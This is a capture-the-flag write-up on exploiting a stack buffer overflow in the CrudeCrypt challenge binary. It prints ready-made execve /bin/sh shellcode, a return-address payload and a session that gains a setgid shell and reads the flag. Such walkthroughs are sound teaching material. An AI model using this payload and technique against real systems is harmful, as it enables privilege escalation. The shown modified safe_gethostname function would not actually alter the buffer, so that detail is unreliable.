# CrudeCrypt Writeup
##### By sdamashek of TJ CSL

CrudeCrypt is an encryption/decryption program. After reading the code, we knew it uses AES128-CBC for the encryption and decryption. After staring at it for a little while, we saw no clear vulnerability with the actual encryption/decryption functions (`encrypt_buffer` and `decrypt_buffer`), so we concluded the vulnerability must be somewhere else.

The program takes an action from the command line (either `encrypt` or `decrypt`), and returns if the command is not a valid action. We noticed that the program drops privileges if the action is `encrypt`:

```c
if(strcmp(argv[1], "encrypt") == 0) {
    action = &encrypt_file;
    // You shouldn't be able to encrypt files you don't have permission to.
    setegid(getgid());
```

Thus, the vulnerability has to be in the `decrypt` action, because the file we have to become the `crudecrypt` group to read `flag.txt`. Because the `decrypt_file` function checks if the encrypted file is both a multiple of the block size (16) and has a magic number in the header of `0xc0dec0de`, we couldn't just decrypt `flag.txt` and encrypt the result to get the flag. After a bit of denial, we concluded the only way to read `flag.txt` was to get a shell, instead of tricking the program into decrypting it, then getting the flag from that result. It also helped that it was also a binary exploitation problem instead of crypto.

Something that we found really interesting early on was this function call in `decrypt_file`:

```c
if(!check_hostname(header)) {
    printf("[#] Warning: File not encrypted by current machine.\n");
}
// check_hostname:
bool check_hostname(file_header* header) {
    char saved_host[HOST_LEN], current_host[HOST_LEN];
    strncpy(saved_host, header->host, strlen(header->host));
    safe_gethostname(current_host, HOST_LEN);
    return strcmp(saved_host, current_host) == 0;
}
```

This function seemed rather pointless, as it doesn't error out. After experimenting with some different runs, we noticed it gave this error on some machines, even when it *was* encrypted on the current machine. It seemed pretty obvious at this point that something was up here, and that this is probably where the exploit should go. We looked at how the hostname was retrieved in the encryption function and placed in the encrypted file:

```c
file_header header;
init_file_header(&header, size);
safe_gethostname(header.host, HOST_LEN);
// safe_gethostname:
void safe_gethostname(char *name, size_t len) {
    gethostname(name, len);
    name[len-1] = '\0';
}
```

Okay, so `safe_gethostname` gets `HOST_LEN` (32) characters of the hostname and makes sure the end is terminated by a null byte. But, when decrypting the file, the program doesn't check that the hostname is null terminated. But how does that help us? Look at these lines in `check_hostname` specifically:

```c
char saved_host[HOST_LEN], current_host[HOST_LEN];
strncpy(saved_host, header->host, strlen(header->host));
```

Since `HOST_LEN` is only 32, if `header->host` is not null terminated, `strlen` will return longer than 32, in fact it will continue to the next null byte, and we have a buffer overflow. Lets look at how `header` is set in `decrypt_file`:

```c
if(decrypt_buffer(enc_buf, size, (char*)key, 16) != 0) {
    printf("There was an error decrypting the file!\n");
    return;
}

char* raw_buf = enc_buf;
file_header* header = (file_header*) raw_buf;

// file_header struct
typedef struct {
    unsigned int magic_number;
    unsigned long file_size;
    char host[HOST_LEN];
} file_header;
```

I modified `safe_gethostname` to always set `name` to 32 "k"s, without a null terminator, so that a buffer overflow would occur on decryption:

```c
void safe_gethostname(char *name, size_t len) {
    name = "kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk";
}
```

As shown above, the `strncpy` will now copy up to the next null byte onto the stack. If you're not familiar with how buffer overflows work, I recommend reading a tutorial before reading below, such as http://faculty.kfupm.edu.sa/ics/zhioua/Teaching/ICS444/BufferOverflowTutorial2012.pdf. Since the stack is executable, we can just put shellcode on the stack at this point, and use the normal method of jumping to it. The stack layout in `check_hostname` after `strncpy` is called looks like this:

```txt
  32 bytes     8 bytes    4 bytes    4 bytes
[saved_host] [empty space] [ebp] [return address]
```

In my exploit, I placed my shellcode after the return address. Because ASLR is disabled, I didn't have to use any fancy techniques, I could just find the address of the start of the shellcode and overwrite the return address with that address. I determined the second byte after the return address to be located at `0xffffd5d1` using gdb and some experimentation (second because it requires one byte of padding before the shellcode). Below is my payload:

```txt
 filler
aaaaaaaa

fake ebp
bbbb

return address (pointer to shellcode)
\xd1\xd5\xff\xff

padding for alignment
a

shellcode (execve /bin/sh)
\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68

terminating null byte
\00
```

I then encrypt this with my custom crude_crypt and decrypt with the supplied setgid crude_crypt in `/home/crudecrypt`:

```bash
pico46900@shell:~$ python -c 'print "aaaaaaaabbbb\xd1\xd5\xff\xffa\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\00"' > payload
pico46900@shell:~$ ./crude_crypt encrypt payload payload.enc
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: a

Got hostname into header, got 'kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk`�`'
=> Encrypted file successfully
pico46900@shell:~$ cd /home/crudecrypt
pico46900@shell:/home/crudecrypt$ ./crude_crypt decrypt ~/payload.enc ~/payload.out
-=- Welcome to CrudeCrypt 0.1 Beta -=-
-> File password: a

$ cat /home/crudecrypt/flag.txt
writing_software_is_hard
```
